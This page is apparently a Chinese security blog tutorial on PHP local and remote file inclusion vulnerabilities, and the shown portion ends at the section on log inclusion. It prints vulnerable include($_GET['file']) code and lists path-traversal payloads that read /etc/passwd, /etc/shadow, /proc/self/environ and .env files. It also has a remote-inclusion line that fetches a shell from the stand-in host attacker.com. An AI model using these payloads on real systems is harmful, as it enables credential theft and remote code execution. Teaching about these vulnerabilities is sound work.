@@ -1,0 +1,1123 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    文件包含漏洞详解及利用 | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="文件包含漏洞  一、基础知识  1.什么是文件包含漏洞  1.1 基本概念 文件包含漏洞是指应用程序在引入文件时，用户能够控制包含的文件路径，导致服务器执行了非预期的文件内容。 123456&#x2F;&#x2F; 正常使用&lt;?php include(&#x27;header.php&#x27;); ?&gt;&#x2F;&#x2F; 存在漏洞的代码&lt;?php include($_GET[&#x27;file&#x27;]">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞详解及利用">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="文件包含漏洞  一、基础知识  1.什么是文件包含漏洞  1.1 基本概念 文件包含漏洞是指应用程序在引入文件时，用户能够控制包含的文件路径，导致服务器执行了非预期的文件内容。 123456&#x2F;&#x2F; 正常使用&lt;?php include(&#x27;header.php&#x27;); ?&gt;&#x2F;&#x2F; 存在漏洞的代码&lt;?php include($_GET[&#x27;file&#x27;]">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-08-20T04:11:47.000Z">
+<meta property="article:modified_time" content="2026-08-20T04:13:17.667Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="web漏洞">
+<meta name="twitter:card" content="summary">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="文件包含漏洞详解及利用">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">文件包含漏洞详解及利用</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> 文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.什么是文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#11-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> 1.1 基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#12-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.1.2.</span> <span class="toc-text"> 1.2 为什么会存在文件包含漏洞？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2php-%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2.PHP 中常见的文件包含函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21-%E5%87%BD%E6%95%B0%E5%AF%B9%E6%AF%94"><span class="toc-number">1.1.2.1.</span> <span class="toc-text"> 2.1 函数对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#22-%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.2.2.</span> <span class="toc-text"> 2.2 执行原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 3.文件包含漏洞的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#31-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABlfi-local-file-inclusion"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 3.1 本地文件包含（LFI - Local File Inclusion）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#32-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrfi-remote-file-inclusion"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 3.2 远程文件包含（RFI - Remote File Inclusion）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4lfi-%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 4.LFI 基础利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#41-%E8%AF%BB%E5%8F%96%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 4.1 读取敏感文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#42-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86path-traversal"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 4.2 目录遍历（Path Traversal）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#43-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.4.3.</span> <span class="toc-text"> 4.3 包含日志文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#44-php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.4.</span> <span class="toc-text"> 4.4 PHP 伪协议利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.5.</span> <span class="toc-text"> 5.Session 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#51-session-%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.5.1.</span> <span class="toc-text"> 5.1 Session 文件基础知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#52-session-%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="toc-number">1.1.5.2.</span> <span class="toc-text"> 5.2 Session 文件命名规则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#53-session-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.1.5.3.</span> <span class="toc-text"> 5.3 Session 文件内容格式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#54-%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6-session-%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.6.</span> <span class="toc-text"> 5.4 如何控制 Session 内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6session-upload-progress-%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.7.</span> <span class="toc-text"> 6.Session Upload Progress 详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#61-%E4%BB%80%E4%B9%88%E6%98%AF-session-upload-progress"><span class="toc-number">1.1.7.1.</span> <span class="toc-text"> 6.1 什么是 Session Upload Progress？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#62-%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text"> 6.2 触发条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#63-%E5%86%99%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.7.3.</span> <span class="toc-text"> 6.3 写入过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#64-session-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">1.1.7.4.</span> <span class="toc-text"> 6.4 Session 文件内容</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#65-%E8%87%AA%E5%8A%A8%E6%B8%85%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.7.5.</span> <span class="toc-text"> 6.5 自动清理机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89race-condition"><span class="toc-number">1.1.8.</span> <span class="toc-text"> 7.条件竞争（Race Condition）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#71-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.1.8.1.</span> <span class="toc-text"> 7.1 为什么需要条件竞争</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#72-%E7%AB%9E%E4%BA%89%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.8.2.</span> <span class="toc-text"> 7.2 竞争策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#73-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.1.8.3.</span> <span class="toc-text"> 7.3 多线程实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8lfi-rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.9.</span> <span class="toc-text"> 8.LFI -&gt; RCE（远程代码执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#81-%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF"><span class="toc-number">1.1.9.1.</span> <span class="toc-text"> 8.1 攻击链路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#82-%E5%B8%B8%E7%94%A8payload"><span class="toc-number">1.1.9.2.</span> <span class="toc-text"> 8.2 常用Payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.1.10.</span> <span class="toc-text"> 9.防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#91-%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.10.1.</span> <span class="toc-text"> 9.1 代码层面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#92-%E9%85%8D%E7%BD%AE%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.10.2.</span> <span class="toc-text"> 9.2 配置层面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#93-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B1%82%E9%9D%A2"><span class="toc-number">1.1.10.3.</span> <span class="toc-text"> 9.3 服务器层面</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.11.</span> <span class="toc-text"> 10.总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%85%B8%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、典例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021easycleanup"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.[第五空间 2021]EasyCleanup</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-文件包含漏洞详解及利用" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-08-20T04:11:47.000Z" itemprop="datePublished">2026-08-20</time>
+    <time style="display: none;" id="post-update-time">2026-08-20</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="文件包含漏洞"><a class="markdownIt-Anchor" href="#文件包含漏洞"></a> 文件包含漏洞</h1>
+<h2 id="一-基础知识"><a class="markdownIt-Anchor" href="#一-基础知识"></a> 一、基础知识</h2>
+<h3 id="1什么是文件包含漏洞"><a class="markdownIt-Anchor" href="#1什么是文件包含漏洞"></a> 1.什么是文件包含漏洞</h3>
+<h4 id="11-基本概念"><a class="markdownIt-Anchor" href="#11-基本概念"></a> 1.1 基本概念</h4>
+<p>文件包含漏洞是指应用程序在引入文件时，用户能够控制包含的文件路径，导致服务器执行了非预期的文件内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 正常使用</span><br><span class="line">&lt;?php include(&#x27;header.php&#x27;); ?&gt;</span><br><span class="line"></span><br><span class="line">// 存在漏洞的代码</span><br><span class="line">&lt;?php include($_GET[&#x27;file&#x27;]); ?&gt;</span><br><span class="line">// 用户可控制：?file=../../etc/passwd</span><br></pre></td></tr></table></figure>
+<h4 id="12-为什么会存在文件包含漏洞"><a class="markdownIt-Anchor" href="#12-为什么会存在文件包含漏洞"></a> 1.2 为什么会存在文件包含漏洞？</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">原因</th>
+<th style="text-align:left">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>动态包含</strong></td>
+<td style="text-align:left">开发者根据用户输入动态决定包含哪个文件</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>路径可控</strong></td>
+<td style="text-align:left">用户输入直接拼接到文件路径中</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>缺乏过滤</strong></td>
+<td style="text-align:left">没有对用户输入进行安全验证</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>配置不当</strong></td>
+<td style="text-align:left"><code>allow_url_include = On</code> 允许远程包含</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2php-中常见的文件包含函数"><a class="markdownIt-Anchor" href="#2php-中常见的文件包含函数"></a> 2.PHP 中常见的文件包含函数</h3>
+<h4 id="21-函数对比"><a class="markdownIt-Anchor" href="#21-函数对比"></a> 2.1 函数对比</h4>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">包含失败时</th>
+<th style="text-align:left">执行代码</th>
+<th style="text-align:left">可包含远程文件（allow_url_include=On）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>include()</code></td>
+<td style="text-align:left">产生警告，脚本继续执行</td>
+<td style="text-align:left">✅</td>
+<td style="text-align:left">✅</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>include_once()</code></td>
+<td style="text-align:left">产生警告，脚本继续执行</td>
+<td style="text-align:left">✅（仅一次）</td>
+<td style="text-align:left">✅</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>require()</code></td>
+<td style="text-align:left">产生致命错误，脚本停止</td>
+<td style="text-align:left">✅</td>
+<td style="text-align:left">✅</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>require_once()</code></td>
+<td style="text-align:left">产生致命错误，脚本停止</td>
+<td style="text-align:left">✅（仅一次）</td>
+<td style="text-align:left">✅</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>include()</code> + 远程</td>
+<td style="text-align:left">可包含远程文件</td>
+<td style="text-align:left">✅</td>
+<td style="text-align:left">✅</td>
+</tr>
+</tbody>
+</table>
+<h4 id="22-执行原理"><a class="markdownIt-Anchor" href="#22-执行原理"></a> 2.2 执行原理</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含文件 → PHP 读取文件内容 → 检测 &lt;?php 标签 → </span><br><span class="line">    ├─ 是PHP代码 → 执行代码</span><br><span class="line">    └─ 不是PHP代码 → 直接输出原内容</span><br></pre></td></tr></table></figure>
+<h3 id="3文件包含漏洞的分类"><a class="markdownIt-Anchor" href="#3文件包含漏洞的分类"></a> 3.文件包含漏洞的分类</h3>
+<h4 id="31-本地文件包含lfi-local-file-inclusion"><a class="markdownIt-Anchor" href="#31-本地文件包含lfi-local-file-inclusion"></a> 3.1 本地文件包含（LFI - Local File Inclusion）</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;file&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>攻击示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=/etc/passwd           # 读取系统文件</span><br><span class="line">?file=/tmp/sess_c           # 读取Session文件</span><br><span class="line">?file=../../config.php      # 目录遍历</span><br><span class="line">?file=/proc/self/environ    # 读取环境变量</span><br></pre></td></tr></table></figure>
+<p><strong>条件</strong>：</p>
+<ul>
+<li>目标文件在服务器本地</li>
+<li>有读取权限</li>
+<li>路径可预测</li>
+</ul>
+<h4 id="32-远程文件包含rfi-remote-file-inclusion"><a class="markdownIt-Anchor" href="#32-远程文件包含rfi-remote-file-inclusion"></a> 3.2 远程文件包含（RFI - Remote File Inclusion）</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_GET[&#x27;file&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>攻击示例</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
+<p><strong>条件</strong>：</p>
+<ul>
+<li><code>allow_url_include = On</code></li>
+<li><code>allow_url_fopen = On</code></li>
+<li>目标服务器可访问外网</li>
+</ul>
+<h3 id="4lfi-基础利用方式"><a class="markdownIt-Anchor" href="#4lfi-基础利用方式"></a> 4.LFI 基础利用方式</h3>
+<h4 id="41-读取敏感文件"><a class="markdownIt-Anchor" href="#41-读取敏感文件"></a> 4.1 读取敏感文件</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 常见系统文件</span><br><span class="line">?file=/etc/passwd</span><br><span class="line">?file=/etc/shadow</span><br><span class="line">?file=/etc/hosts</span><br><span class="line">?file=/etc/nginx/nginx.conf</span><br><span class="line">?file=/var/log/apache2/access.log</span><br><span class="line"></span><br><span class="line"># PHP配置文件</span><br><span class="line">?file=/etc/php/php.ini</span><br><span class="line">?file=/var/www/html/config.php</span><br><span class="line">?file=../../.env</span><br><span class="line"></span><br><span class="line"># 程序文件</span><br><span class="line">?file=index.php</span><br><span class="line">?file=../../config/database.php</span><br></pre></td></tr></table></figure>
+<h4 id="42-目录遍历path-traversal"><a class="markdownIt-Anchor" href="#42-目录遍历path-traversal"></a> 4.2 目录遍历（Path Traversal）</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../etc/passwd</span><br><span class="line">?file=../../../var/log/apache2/error.log</span><br><span class="line">?file=../../../../../../../tmp/sess_c</span><br></pre></td></tr></table></figure>
+<h4 id="43-包含日志文件"><a class="markdownIt-Anchor" href="#43-包含日志文件"></a> 4.3 包含日志文件</h4>
